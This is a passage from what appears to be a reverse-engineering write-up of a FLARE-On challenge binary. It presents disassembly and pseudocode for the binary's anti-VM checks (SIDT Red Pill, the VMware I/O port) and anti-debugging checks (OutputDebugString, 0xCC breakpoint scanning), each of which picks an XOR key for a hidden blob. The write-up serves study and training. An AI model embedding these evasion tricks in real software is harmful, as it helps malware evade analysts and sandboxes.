</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401350</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4013</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401460</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4014</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401590</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img src="/images/2014/flare/7-7.jpg" alt="SIDT Red Pill" title="SIDT Red Pill" /></p>

<p>Jumping into <code>sub_401130</code> we see an old anti-VM technique. This is called <a href="http://repo.hackerzvoice.net/depot_ouah/Red_%20Pill.html">The Red Pill</a>. Each CPU core has its own <code>Interrupt Descriptor Table (IDT}</code>. IDT is essentially an interrupt vector table. Because the VM manager is juggling two operating systems but there is one location per core, it has to relocate IDT of guest OS in memory. The application can check this location for known addresses assigned by VM managers and determine if it is running in a VM.</p>

<p>But how is this accomplished? Each core has one register called the <code>Interrupt Descriptor Table Register (IDTR)</code> that points to this location in memory. The userland (ring3) instruction<code>SIDT</code> will save this register. VM managers store the relocated tables in different places and the value of this register can act as a VM manager fingerprint.</p>

<p>According to <a href="http://vrt-blog.snort.org/2009/10/how-does-malware-know-difference.html">this post</a> by Alain Zidouemba these are some of the addresses:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">VM Manager</th>
      <th style="text-align: left">Address</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">Windows</td>
      <td style="text-align: left">0x80FFFFFF</td>
    </tr>
    <tr>
      <td style="text-align: left">Virtual PC</td>
      <td style="text-align: left">0xE8XXXXXX</td>
    </tr>
    <tr>
      <td style="text-align: left">VMware</td>
      <td style="text-align: left">0xFFXXXXXX</td>
    </tr>
  </tbody>
</table>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>SIDT Red Pill </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">00401138</span> <span class="nb">si</span><span class="nv">dt</span>    <span class="nv">fword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040113</span><span class="nf">C</span> <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">8</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="c1">; edi = IDT address (in this run 0xBAB3C590)</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040113</span><span class="nf">F</span> <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">bl</span><span class="nv">ob_length</span> <span class="c1">; 0x106240</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401145</span> <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">edi</span>                     <span class="c1">; eax = edi = IDT address</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401147</span> <span class="nf">and</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">0FF000000h</span>              <span class="c1">; Getting the first byte of address</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040114</span><span class="nf">C</span> <span class="nv">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040114</span><span class="nf">E</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">0FF000000h</span>              <span class="c1">; Comparing the first byte with 0xFF</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401153</span> <span class="nf">jnz</span>     <span class="nv">short</span> <span class="nv">loc_40119A</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>The above compares the first byte of IDT address with <code>0xFF</code>. According to our table it is looking for <code>VMware</code>. But we are not running it. If this check passes (meaning we are not running VMware) the string <code>you're so bad</code> is going to be xor-ed with the blob, otherwise it will be <code>you're so good</code>. The address <code>0xBAB3C590</code> did not change during my runs in one VM. I will have to try with a different VM in VirtualBox to see if it changes or if it has a pattern. If you know please let me know.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>VMware Detection via Red Pill </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">running_in_vmware</span><span class="p">):</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">you</span><span class="err">’</span><span class="n">re</span> <span class="n">so</span> <span class="n">good</span><span class="err">”</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">you</span><span class="err">’</span><span class="n">re</span> <span class="n">so</span> <span class="n">bad</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4 id="function-4---vmware-detection-2-electric-boogaloo">Function 4 - VMware Detection 2: Electric Boogaloo</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4011</span><span class="nv">D0</span>       <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4012</span><span class="nv">A0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401350</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4013</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401460</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4014</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401590</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4016</span><span class="nv">F0</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>What’s in the box?</p>

<p><img src="/images/2014/flare/7-8.jpg" alt="VMware detection 2" title="VMware detection 2" /></p>

<p>Function will create its own exception handler, it will return the execution to <code>loc_401232</code> if an exception occurs. Then we have some interesting instructions. If we look at the <a href="https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/">Malware Bytes</a> article, it is named <code>VMware I/O port</code>. These are the magic instructions:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>VMware I/O port check </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">0040120</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">564D5868h</span>   <span class="c1">; save magic number to eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401213</span> <span class="nf">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0Ah</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401218</span> <span class="nf">mov</span>     <span class="nb">dx</span><span class="p">,</span> <span class="mh">5658h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040121</span><span class="nf">C</span> <span class="nv">in</span>      <span class="nb">eax</span><span class="p">,</span> <span class="nb">dx</span>          <span class="c1">; if in VMware, this instruction will save the magic number in ebx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040121</span><span class="nf">D</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_1C</span><span class="p">],</span> <span class="nb">ebx</span>    <span class="c1">; executes if in VMware otherwise exception</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>It’s a quick way to find if the application is running in a VMware VM. If <code>in eax, dx</code> is successful, it will save the magic number in <code>ebx</code> and then <code>var_1C</code>. If not, it will raise an exception. But the function has an exception handler and execution will be transferred back to the function. Then <code>var_1C</code> is compared to the magic number to determine if the application is in a VMware VM or not.</p>

<p>I was running the application in VirtualBox. Apparently Fireeye thinks we are all rich and use VMware ;) So the check failed.</p>

<p><img src="/images/2014/flare/7-9.jpg" alt="VMware detection 2 continued" title=" VMware detection 2 continued" /></p>

<p>The rest of the function is pretty simple, if the check fails <code>0x66</code> (character <code>f</code>) will be xor-ed with the blob. If running in VMware <code>0x01</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>VMWare Detection 2 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">running_in_vmware</span><span class="p">):</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="mh">0x01</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="mh">0x66</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3 id="function-5---outputdebugstring">Function 5 - OutputDebugString</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4012</span><span class="nv">A0</span>       <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401350</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4013</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401460</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4014</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401590</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img src="/images/2014/flare/7-10.jpg" alt="OutputDebugString" title="OutputDebugString" /></p>

<p>This is almost the same as listing 16-1 in page 353 of <code>Practical Malware Analysis</code> book (<a href="http://books.google.com/books?id=FQC8EPYy834C&amp;pg=PA353&amp;dq=outputdebugstring&amp;hl=en&amp;sa=X&amp;ei=lcksVI7JM9bGsQSdpoGACA&amp;ved=0CDsQ6AEwBQ#v=onepage&amp;q=outputdebugstring&amp;f=false">Link to p.353 on Google Books</a>). First the current error code is set to <code>0x1234</code>. Then <code>OutputDebugString</code> is called with string <code>bah!</code>. An error occurs if a debugger is not attached to the application and current error code changes, otherwise there is no error and last error code remains <code>0x1234</code>. Later, last error code is retrieved by calling <code>GetLastError</code>, if this value is not changed then a debugger is attached to the application and string <code>Sandboxes are fun to play in</code> is xor-ed with blob. In the absence of a debugger, <code>I'm gonna sandbox your face</code> is used.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>OutputDebugString </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nf">if</span><span class="p">(</span><span class="nv">debugger_is_attached</span><span class="p">):</span>
</span><span class='line'>    <span class="nf">blob</span> <span class="err">=</span> <span class="nv">xor</span><span class="p">(</span><span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span><span class="err">”</span><span class="nv">Sandboxes</span> <span class="nv">are</span> <span class="nv">fun</span> <span class="nv">to</span> <span class="nv">play</span> <span class="nv">in</span><span class="err">”</span><span class="p">)</span>
</span><span class='line'><span class="nl">else:</span>
</span><span class='line'>    <span class="nf">blob</span> <span class="err">=</span> <span class="nv">xor</span><span class="p">(</span><span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span> <span class="err">“</span><span class="nv">I</span><span class="err">’</span><span class="nv">m</span> <span class="nv">gonna</span> <span class="nv">sandbox</span> <span class="nv">your</span> <span class="nv">face</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3 id="function-6---i-can-haz-breakpoint">Function 6 - I Can Haz Breakpoint?</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401350</span>       <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4013</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401460</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4014</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401590</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4016</span><span class="nv">F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img src="/images/2014/flare/7-11.jpg" alt="0xCC Check" title="0xCC Check" /></p>

<p>Offsets from two functions are loaded and then compared. The first one calls <code>isDebuggerPresent</code> and the second one just prints something and exits. We have seen this function before, it is the first check.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>calls_isDebuggerPresent </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">01030</span> <span class="nf">calls_isDebuggerPresent</span> <span class="nv">proc</span> <span class="nv">near</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401030</span> <span class="nf">push</span>    <span class="nb">esi</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401031</span> <span class="nf">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">IsDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401037</span> <span class="nf">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">bl</span><span class="nv">ob_length</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040103</span><span class="nf">D</span> <span class="nv">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040103</span><span class="nf">F</span> <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401041</span> <span class="nf">jz</span>      <span class="nv">short</span> <span class="nv">loc_401079</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>sub<em>401780 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401780</span> <span class="nf">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401780</span> <span class="nv">proc</span> <span class="nv">near</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401780</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401780</span> <span class="nf">arg</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">0</span><span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span>  <span class="mi">8</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401780</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401780</span> <span class="nf">push</span>    <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401781</span> <span class="nf">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401783</span> <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">arg</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401786</span> <span class="nf">push</span>    <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401787</span> <span class="nf">push</span>    <span class="nv">offset</span> <span class="nv">aBmoChopD</span> <span class="c1">; “BMO Chop! [%d]\n”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040178</span><span class="nf">C</span> <span class="nv">call</span>    <span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="nv">printf</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401791</span> <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">8</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401794</span> <span class="nf">push</span>    <span class="mh">0FFFFDCD7h</span>      <span class="c1">; uExitCode</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401799</span> <span class="nf">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">ExitProcess</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401799</span> <span class="nf">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401780</span> <span class="nv">endp</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>None of these functions are called. But their offsets are compared. If offset of <code>calls_isDebuggerPresent</code> is larger than <code>sub_401780</code> then we jump down and string <code>I can haz decode?</code> is xor-ed with the blob. Otherwise we go right. <strong>I am not quite sure what this check is for</strong>. I think it is trying to find if calls to <code>isDebuggerPresent</code> are redirected or not (by the debugger?) as the address of the first function is <code>0x401030</code> and is smaller than <code>0x401780</code>. If you know what this means please let me know and I will update this section. In all of my runs the jump does not happen and execution continues to the right.</p>

<p>To the right we can see a pretty standard <code>0xCC</code> check. <code>0xCC</code> is the code for <code>INT 3</code> and is used by debuggers to set breakpoints. It is simply checking if <code>0xCC</code> bytes are present in the function code. If <code>0xCC</code> is present <code>ecx</code> is increased by 2, otherwise by one. In the end this number is compared with <code>0x55</code>. If the check does not pass it will jump to left (same as above) and <code>I can haz decode?</code> is xor-ed with the blob. If the number is <code>0x55</code> string <code>Such fire. Much burn. Wow.</code> is xor-ed with the blob.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>ICanHaz? </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">calls_isDebuggerPresent</span><span class="o">.</span><span class="n">address</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">sub_401780</span><span class="o">.</span><span class="n">address</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">calls_isDebuggerPresent</span><span class="o">.</span><span class="n">has0xCC</span> <span class="o">==</span> <span class="bp">True</span> <span class="p">):</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">I</span> <span class="n">can</span> <span class="n">haz</span> <span class="n">decode</span><span class="err">?”</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
